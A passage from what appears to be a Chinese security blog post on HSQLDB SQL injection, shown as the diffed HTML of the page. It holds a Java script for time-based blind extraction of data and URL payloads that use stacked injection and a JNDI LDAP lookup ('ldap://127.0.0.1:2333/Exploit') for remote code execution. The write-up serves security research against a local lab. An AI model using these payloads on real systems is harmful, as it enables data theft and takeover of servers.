+            param.put(&quot;keyword&quot;,&quot;test' and decode(&quot;+getLength+&quot;,&quot;+i+&quot;,&quot;+sleep+&quot;,true) --!&quot;);
+            long start = System.currentTimeMillis();
+            String body = Requests.get(url).timeout(60000).params(param).send().readToText();
+            long end = System.currentTimeMillis();
+            System.out.println(end-start);
+            if ((end-start)&gt;flag_timeout){
+                length = i;
+                break;
+            }else{
+                continue;
+            }
+        }
+        System.out.println(sql + &quot; length = &quot;+length);
+        for (int i = 1; i &lt;= length ; i++) {
+            for (int j = 0; j &lt;= 9; j++) {
+                HashMap param = new HashMap&lt;&gt;();
+                param.put(&quot;keyword&quot;, &quot;test' and decode(substr(&quot;+sql+&quot;,&quot;+i+&quot;,1),'&quot;+j+&quot;',&quot;+sleep+&quot;,true) --!&quot;);
+                long start = System.currentTimeMillis();
+                String body = Requests.get(url).timeout(60000).params(param).send().readToText();
+                System.out.println(param);
+                long end = System.currentTimeMillis();
+                if ((end-start)&gt;flag_timeout){
+                    result.append(j);
+                    break;
+                }else{
+                    continue;
+                }
+            }
+        }
+        System.out.println(&quot;HEX result = &quot;+result);
+        System.out.println(&quot;UNHEX result = &quot;+ new String(Hex.decode(result)));
+
+    }
+}</code></pre><p><img src="/usr/uploads/2020/12/1309351720.png" alt="image-20201229140109043.png" title="image-20201229140109043.png"></p><p>在布尔盲注的脚本基础上稍作修改就可以跑出数据了。</p><h3>6.5 堆叠注入</h3><p>前面提到过，hsqldb 是默认允许堆叠查询的，所以可以像 sqlserver 一样自由的执行其他命令。</p><p>例如通过 CALL 命令调用 Java 方法 RCE</p><pre><code>http://localhost:8888/query?keyword=test';CALL &quot;javax.naming.InitialContext.doLookup&quot;('ldap://127.0.0.1:2333/Exploit');--!</code></pre><p><img src="/usr/uploads/2020/12/2582499266.png" alt="image-20201229145722433.png" title="image-20201229145722433.png"></p><p>顺便提一下，在注入场景下要想执行 Java 方法也不一定非要依靠堆叠注入，上面只是以 CALL 命令举个例子，如果遇到不可以堆叠注入的情况也可以直接去掉 CALL 带入查询。</p><pre><code>http://localhost:8888/query?keyword=test' and &quot;javax.naming.InitialContext.doLookup&quot;('ldap://127.0.0.1:2333/Exploit')!=null and 'a'='a</code></pre><p><img src="/usr/uploads/2021/01/143621691.jpg" alt="1609748312.jpg" title="1609748312.jpg"></p><h1>7. 参考</h1><p><a href="http://www.hsqldb.org/doc/2.0/guide/builtinfunctions-chapt.html" target="_blank">http://www.hsqldb.org/doc/2.0/guide/builtinfunctions-chapt.html</a><br><a href="http://www.hsqldb.org/doc/2.0/guide/dbproperties-chapt.html" target="_blank">http://www.hsqldb.org/doc/2.0/guide/dbproperties-chapt.html</a><br><a href="https://github.com/longofo/hsqldb-source" target="_blank">https://github.com/longofo/hsqldb-source</a><br><a href="https://paper.seebug.org/1271/" target="_blank">https://paper.seebug.org/1271/</a></p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-420" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/458.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/458.html#respond-post-420" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
